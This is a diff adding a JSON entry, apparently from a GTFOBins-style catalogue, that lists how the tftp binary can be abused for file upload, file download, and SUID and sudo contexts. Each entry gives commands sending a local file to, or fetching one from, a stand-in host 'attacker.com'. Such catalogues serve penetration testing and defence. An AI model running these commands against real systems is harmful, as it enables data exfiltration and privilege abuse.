@@ -1,0 +1,28 @@
+{
+  "functions": {
+    "file-upload": [
+      {
+        "description": "Send local file to a TFTP server.",
+        "code": "RHOST=attacker.com\ntftp $RHOST\nput file_to_send\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file from a TFTP server.",
+        "code": "RHOST=attacker.com\ntftp $RHOST\nget file_to_get\n"
+      }
+    ],
+    "suid": [
+      {
+        "description": "Send local file to a TFTP server.",
+        "code": "RHOST=attacker.com\n./tftp $RHOST\nput file_to_send\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "Send local file to a TFTP server.",
+        "code": "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send\n"
+      }
+    ]
+  }
+}
